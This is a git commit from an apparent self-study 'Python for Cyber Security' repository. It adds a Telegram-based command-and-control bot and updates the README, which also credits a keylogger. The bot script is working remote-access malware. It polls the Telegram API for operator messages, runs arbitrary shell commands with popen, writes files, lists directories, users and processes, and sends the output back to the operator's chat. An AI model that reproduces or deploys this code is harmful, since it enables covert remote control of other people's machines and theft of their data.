aeacf892fa744bf1c141c1c507aa61a306fcf52c
juba0x00 <mahmoudhawash90@gmail.com>
2022-09-17 17:34:06 +0200

    adding CnC-Telegram

--- README.md
+++ README.md
@@ -1,8 +1,10 @@
 # Py4CyberSec
 Python For Cyber Security
+notes while my learning journey 
 
 
 
 # References 
 - Python for Hackers by Joas Antonio
-- (Keylogger)[https://github.com/davidbombal/python-keylogger/blob/main/keylogger.py]
+- keylogger inspired by [david bombal](https://github.com/davidbombal/python-keylogger/blob/main/keylogger.py)
+- CnC-Telegram inspired by [Petr Bergmann](https://github.com/bergmpet/cnc-telegram)
---
+++ cnc-telegram/bot.py
@@ -0,0 +1,132 @@
+#!/usr/bin/env python
+from os import listdir, popen
+from requests import get
+from json import loads
+from time import sleep
+import utils
+
+SLEEP_TIME = 3
+MAX_MESSAGE_LENGTH = 4000
+
+
+# Parse JSON from URL request answer
+def get_json(url):
+    res = get(url)
+    return loads(res.content) if res.status_code == 200 else None
+
+
+# ! Attack operations
+# ! -----------------
+
+
+def ls(path):
+    try:
+        return '\n'.join(listdir(path))
+    except FileNotFoundError:
+        print("No such directory")
+        return "Err: No such dir"
+
+
+def active_users():
+    return '\n'.join([line.split('    ')[0] for line in popen('w').readlines()[-1:1:-1]])
+
+
+def ps():
+    return ''.join([line.split(' ')[-1] for line in popen('ps').readlines()[-1:0:-1]])
+
+
+def write_to_file(filename, data):
+    try:
+        with open(filename, 'a') as file:
+            file.write(data)
+            return 'done'
+
+    except FileNotFoundError as Error:
+        print(Error)
+        return Error
+
+
+def exec_command(command):
+    return '\n'.join(popen(' '.join(command)).readlines())
+
+
+def parse_payload(command):
+    splitted = command.split(" ")
+    if splitted[0] == "ls" and len(splitted) >= 2:
+        files = ls(splitted[1])
+        return utils.DIR_HTML.format(splitted[1]) + files
+    elif splitted[0] == "users":
+        return utils.USR_HTML + active_users()
+    elif splitted[0] == "processes":
+        return utils.PCS_HTML + ps()
+    elif splitted[0] == "write" and len(splitted) >= 3:
+        return utils.WRT_HTML + write_to_file(splitted[1], splitted[2])
+    elif splitted[0] == 'execute':
+        return exec_command(splitted[1:])
+    elif splitted[0] == "terminate":
+        return "terminate"
+    else:
+        return utils.HELP
+
+
+# ! Telegram API communication
+# ! --------------------------
+def get_status():
+    answer = get(utils.URL + "/getme")
+    if answer.status_code == 200:
+        print("Connection works")
+    else:
+        print("Connection does not work")
+
+
+def mark_read(offset):
+    get_json(utils.URL + "/getUpdates?offset={}".format(offset))
+
+
+def get_updates():
+    answer = get_json(utils.URL + "/getUpdates")
+    if (answer is None) or (not answer["ok"]):
+        print("Wrong request for Updates")
+        return
+
+    for result in answer["result"]:
+        yield result
+
+
+def send_answer(msg, chat_id):
+    start = 0
+    end = min(len(msg), MAX_MESSAGE_LENGTH)
+
+    while True:
+        answer = get_json(utils.URL + "/sendMessage?text={}&chat_id={}".format(msg[start:end], chat_id))
+
+        if (answer is None) or (not answer["ok"]):
+            print("Wrong answer")
+            return
+
+        if len(msg) - end < MAX_MESSAGE_LENGTH:
+            break
+        start = end
+        end = min(len(msg), start + MAX_MESSAGE_LENGTH)
+
+
+# Main runtime - loop until terminate message is obtained
+if __name__ == "__main__":
+    end = False
+    while not end:
+        update_id = -1
+        for update in get_updates():
+            update_id = update["update_id"] + 1
+            message = update["message"]
+            chat_id = message["chat"]["id"]
+
+            response = parse_payload(message["text"])
+            if response == "terminate":
+                end = True
+                break
+            send_answer(response, chat_id)
+
+        if update_id != -1:
+            mark_read(update_id)
+        if not end:
+            sleep(SLEEP_TIME)
